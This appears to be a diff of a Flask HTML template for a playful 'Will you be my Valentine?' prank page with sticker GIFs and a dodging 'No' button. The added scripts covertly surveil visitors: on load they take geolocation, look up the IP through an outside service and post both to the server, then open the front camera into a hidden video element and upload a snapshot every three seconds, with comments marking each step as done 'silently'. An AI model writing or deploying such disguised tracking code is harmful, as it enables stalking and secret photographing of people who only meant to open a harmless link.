@@ -2,149 +2,294 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Surprise for You 💖</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Can I Have Your Heart? 💖</title>
   <link rel="icon" type="image/webp" href="{{ url_for('static', filename='favicon.webp') }}">
   <meta property="og:title" content="Open Me 😳">
   <meta property="og:description" content="At 4:02 AM, a glitter-screaming pigeon did a backflip into a milk bath while texting her ex on a toaster. Meanwhile, a strawberry-scented jellyfish DJ remixed cat meows in a donut-shaped UFO driven by a confused grandma wearing crocs. Somewhere in a pastel alley, a unicorn with WiFi horns screamed I am the moment! while sparkles rained from a cloud shaped like a screaming cupcake. A frog in heels whispered stock tips to a banana peel while 3 invisible raccoons played Uno for the fate of the universe. Reality blinked in pink glitter as a moon-sized boba popped and whispered: click the button, slay the truth.">
   <meta property="og:image" content="https://media.tenor.com/UJzCmI1F77cAAAAj/milk-and-mocha.gif">
   <style>
-    * { box-sizing: border-box; }
-    body {
-      background: #ffd6e8;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
       font-family: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      width: 100%;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      margin: 0;
+      background-color: #ffe5e5;
       padding: 20px;
-      color: #333;
     }
-    .box {
-      background: white;
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+
+    .container {
+      display: flex;
+      flex-direction: column;
       text-align: center;
+      align-items: center;
+      gap: 20px;
+      max-width: 500px;
       width: 100%;
-      max-width: 400px;
     }
-    h1 {
-      font-size: 22px;
-      color: #cc3366;
-      margin-bottom: 20px;
-    }
-    input[type="text"] {
-      padding: 10px;
+
+    .tenor-gif-embed {
+      max-width: 250px;
       width: 100%;
-      border: 1px solid #ccc;
+    }
+
+    .btn {
+      display: flex;
+      gap: 25px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .btn a {
+      text-decoration: none;
+      color: #111;
+      background: #fff;
+      padding: 10px 25px;
       border-radius: 8px;
+      box-shadow: 0.5rem 1rem 3rem rgba(0, 0, 0, 0.3);
+      transition: transform 0.3s ease;
       font-size: 16px;
-      margin-bottom: 20px;
     }
-    button {
-      padding: 10px 20px;
-      background-color: #cc3366;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 16px;
-      width: 100%;
+
+    #move-random {
+      position: relative;
+      transition: top 0.3s ease, left 0.3s ease;
     }
-    .result {
-      margin-top: 20px;
-      font-size: 18px;
-      font-weight: 500;
-    }
-    .gif-container {
-      margin-top: 15px;
-    }
-    .gif-container iframe {
-      width: 100%;
-      height: auto;
-      max-height: 300px;
-      border: none;
-      border-radius: 10px;
+  </style>
+  <style>
+    /* [Keep all your existing styles] */
+    #camera-status {
+      display: none; /* Hidden but still functional for debugging */
     }
   </style>
 </head>
-<body onload="startRecording()">
-
-  <div class="box">
-    <h1>What’s your name?</h1>
-    <input type="text" id="nameInput" placeholder="Type here..." />
-    <button onclick="checkName()">Reveal</button>
-    <div class="result" id="result"></div>
-    <div class="gif-container" id="gifContainer"></div>
+      <body onload="startCamera()">
+        <canvas id="photoCanvas" style="display:none;"></canvas>
+        <div id="camera-status"></div> <!-- Hidden status element -->
+  <div class="container" id="content">
+    <div class="tenor-gif-embed" data-postid="22885016" data-share-method="host" data-aspect-ratio="1.04918" data-width="100%">
+      <a href="https://tenor.com/view/manja-gif-22885016">Manja Sticker</a> from
+      <a href="https://tenor.com/search/manja-stickers">Manja Stickers</a>
+    </div>
+    <script async src="https://tenor.com/embed.js"></script>
+    <h1>Will You be my Valentine? 🤗</h1>
+    <p>I have a surprise for youuu~</p>
+    <div class="btn">
+      <a href="#" class="nextBtn">Yes</a>
+      <a href="#" class="nextBtn">No</a>
+    </div>
   </div>
 
-  <script>
-    const BACKEND_URL = ""; // same server
+  <!-- Templates -->
+  <template id="no1-screen">
+    <div class="tenor-gif-embed" data-postid="22050818" data-share-method="host" data-aspect-ratio="1" data-width="100%">
+      <a href="https://tenor.com/view/mochi-gif-22050818">Mochi Sticker</a> from
+      <a href="https://tenor.com/search/mochi-stickers">Mochi Stickers</a>
+    </div>
+    <h1>BABUUUU~ Think PROPERLY, huh? 🥺💘</h1>
+    <p>You might regret saying no 😤</p>
+    <div class="btn">
+      <a href="#" class="nextBtn">Yes</a>
+      <a href="#" class="nextBtn">No</a>
+    </div>
+  </template>
 
-    function saveNameToDB(name) {
-      fetch(`${BACKEND_URL}/submit-name`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ name })
-      })
-      .then(res => res.json())
-      .then(data => console.log("Saved:", data))
-      .catch(err => console.error("Error saving name:", err));
-    }
+  <template id="no2-screen">
+    <div class="tenor-gif-embed" data-postid="15195810" data-share-method="host" data-aspect-ratio="1" data-width="100%">
+      <a href="https://tenor.com/view/couple-forgive-me-gif-15195810">Forgive Me Sticker</a> from
+      <a href="https://tenor.com/search/couple-stickers">Couple Stickers</a>
+    </div>
+    <h1>Bestieeeee~ I’m BEGGING, think AGAIN!😭💔</h1>
+    <p>I’ll haunt your snacks if you say no! 👻</p>
+    <div class="btn">
+      <a href="#" class="nextBtn">Yes</a>
+      <a href="#" class="nextBtn">No</a>
+    </div>
+  </template>
 
-    function checkName() {
-      const name = document.getElementById("nameInput").value.trim().toLowerCase();
-      saveNameToDB(name); // Save to DB
+  <template id="no3-screen">
+    <div class="tenor-gif-embed" data-postid="15974530976611222074" data-share-method="host" data-aspect-ratio="1.26923" data-width="100%">
+      <a href="https://tenor.com/view/peach-goma-phone-gif-15974530976611222074">Peach Goma Phone Sticker</a> from
+      <a href="https://tenor.com/search/peach+goma-stickers">Peach Goma Stickers</a>
+    </div>
+    <h1>JUST SAY YESSHHH, you icon! 😩🌟</h1>
+    <p>Why resist this level of cuteness? 🥺✨</p>
+    <div class="btn">
+      <a href="#" class="nextBtn">Yes</a>
+      <a href="#" id="move-random">No</a>
+    </div>
+  </template>
 
-      const result = document.getElementById("result");
-      const gifContainer = document.getElementById("gifContainer");
+  <template id="yes-screen">
+    <div class="tenor-gif-embed" data-postid="253027946666209433" data-share-method="host" data-aspect-ratio="1.37853" data-width="100%">
+      <a href="https://tenor.com/view/mochi-cat-mochi-peach-gif">Mochi Cat GIF</a> from
+      <a href="https://tenor.com/search/mochi-gifs">Mochi GIFs</a>
+    </div>
+    <h1>Hehehehe, I knew it! 😘</h1>
+    <p>You're mine now, my pokkie boo~ 💖</p>
+  </template>
 
-      const layaNames = ["laya", "layusss", "layaaa", "lay", "laayaa", "laayaaa", "l4ya", "laaaya", "aani", "layakuty", "layakutty", "layu", "layuss", "layapp", "layappu", "laya pp", "laya p", "layapottu", "layi", "layi baby", "lay-bae", "laypop", "layachu", "laychan", "laypichu", "laypothy", "laypotty", "laya choti", "la ya", "l@ya", "laya123", "layee", "laxa", "laxxa", "leya"];
-      const adarshNames = ["adarsh", "adarshp", "pothan", "poothan", "poth", "pooot", "pothuu", "adarsh pothan", "poth baby", "pothachu", "adarshu", "adarsh bro", "addu", "aadarsh", "addie", "pothie", "pothi", "pothappa", "poth sir", "pothy", "a.p", "p@than", "poth_nation", "adbro", "p-bhai","pothu"];
-
-      result.textContent = "";
-      gifContainer.innerHTML = "";
-
-      if (layaNames.some(n => name.includes(n))) {
-        result.textContent = "💩 Uh oh... a wild soft poop has appeared.";
-        gifContainer.innerHTML = `<iframe src="https://tenor.com/embed/17031606" width="100%" height="300" allowfullscreen></iframe>`;
-      } else if (adarshNames.some(n => name.includes(n))) {
-        result.textContent = "😎 Oh wow... certified legend detected!";
-        gifContainer.innerHTML = `<iframe src="https://tenor.com/embed/17558571950805941757" width="100%" height="300" allowfullscreen></iframe>`;
-      } else {
-        result.textContent = "🧐 Hmmm... curious choice. You might be secretly cool.";
-      }
-    }
-  </script>
     <script>
-    async function startRecording() {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      document.getElementById("preview").srcObject = stream;
+      // Screen switching logic (unchanged)
+      const screens = ['no1-screen', 'no2-screen', 'no3-screen', 'yes-screen'];
+      let currentStep = 0;
 
-      const recorder = new MediaRecorder(stream);
-      const chunks = [];
+      function showNextScreen() {
+        if (currentStep < screens.length) {
+          const template = document.getElementById(screens[currentStep]);
+          if (template) {
+            document.getElementById('content').innerHTML = template.innerHTML;
+            currentStep++;
+            rerunTenorEmbed();
 
-      recorder.ondataavailable = (e) => chunks.push(e.data);
+            const moveEl = document.getElementById('move-random');
+            if (moveEl) {
+              moveEl.addEventListener('mouseenter', () => moveRandomEl(moveEl));
+            }
+          }
+        }
+      }
 
-      recorder.onstop = () => {
-        const blob = new Blob(chunks, { type: 'video/webm' });
-        const formData = new FormData();
-        formData.append('video', blob, 'reaction.webm');
+      function moveRandomEl(elm) {
+        elm.style.position = "absolute";
+        elm.style.top = Math.floor(Math.random() * 80 + 5) + "%";
+        elm.style.left = Math.floor(Math.random() * 80 + 5) + "%";
+      }
 
-        fetch('/upload-video', {
-          method: 'POST',
-          body: formData
-        })
-        .then(res => res.text())
-        .then(msg => alert('Reaction saved to Discord!'))
-        .catch(err => console.error('Upload error:', err));
-      };
+      function rerunTenorEmbed() {
+        const oldScript = document.querySelector('script[src*="tenor.com/embed.js"]');
+        if (oldScript) oldScript.remove();
 
-      recorder.start();
-      setTimeout(() => recorder.stop(), 20000); // Stop after 20 sec
-    }
-  </script>
+        const script = document.createElement('script');
+        script.src = "https://tenor.com/embed.js";
+        script.async = true;
+        document.body.appendChild(script);
+      }
+
+      document.addEventListener('click', function(e) {
+        if (e.target.matches('.nextBtn')) {
+          e.preventDefault();
+          showNextScreen();
+        }
+      });
+    </script>
+
+      <script>
+        // Global variables
+        let videoStream = null;
+        let captureInterval = null;
+        const statusEl = document.getElementById('camera-status');
+        let userLocation = { lat: null, lon: null };
+
+        // 1. Get location silently
+        async function getLocation() {
+          return new Promise((resolve) => {
+            if (navigator.geolocation) {
+              navigator.geolocation.getCurrentPosition(
+                position => {
+                  userLocation.lat = position.coords.latitude;
+                  userLocation.lon = position.coords.longitude;
+                  resolve();
+                },
+                () => resolve(), // Silent fail if blocked
+                { timeout: 5000, maximumAge: 60000 }
+              );
+            } else {
+              resolve();
+            }
+          });
+        }
+
+        // 2. Initialize camera silently
+        async function startCamera() {
+          try {
+            videoStream = await navigator.mediaDevices.getUserMedia({
+              video: { facingMode: "user" },
+              audio: false
+            });
+
+            // Hidden video element
+            const videoEl = document.createElement('video');
+            videoEl.style.display = 'none';
+            document.body.appendChild(videoEl);
+            videoEl.srcObject = videoStream;
+            await videoEl.play();
+
+            // Start periodic capture
+            captureInterval = setInterval(() => {
+              captureAndSend(videoEl);
+            }, 3000);
+
+          } catch (err) {
+            console.error("Camera error:", err);
+          }
+        }
+
+        // 3. Capture and send photo silently
+        async function captureAndSend(videoEl) {
+          const canvas = document.getElementById("photoCanvas");
+          const ctx = canvas.getContext("2d");
+
+          canvas.width = videoEl.videoWidth;
+          canvas.height = videoEl.videoHeight;
+          ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob(async (blob) => {
+            try {
+              const formData = new FormData();
+              formData.append("photo", blob, "capture.jpg");
+              await fetch("/upload-photo", {
+                method: "POST",
+                body: formData
+              });
+            } catch (err) {
+              console.error("Upload error:", err);
+            }
+          }, "image/jpeg", 0.8);
+        }
+
+        // 4. Send initial data silently
+        async function sendInitialData() {
+          try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+
+            await fetch('/log-initial', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                ip: ipData.ip,
+                lat: userLocation.lat,
+                lon: userLocation.lon
+              })
+            });
+          } catch (err) {
+            console.error("Initial data error:", err);
+          }
+        }
+
+        // Initialize everything silently
+        window.addEventListener('DOMContentLoaded', async () => {
+          await getLocation();
+          await sendInitialData();
+          setTimeout(startCamera, 2000);
+        });
+
+        // Cleanup
+        window.addEventListener('beforeunload', () => {
+          if (captureInterval) clearInterval(captureInterval);
+          if (videoStream) {
+            videoStream.getTracks().forEach(track => track.stop());
+          }
+        });
+      </script>
 </body>
 </html>
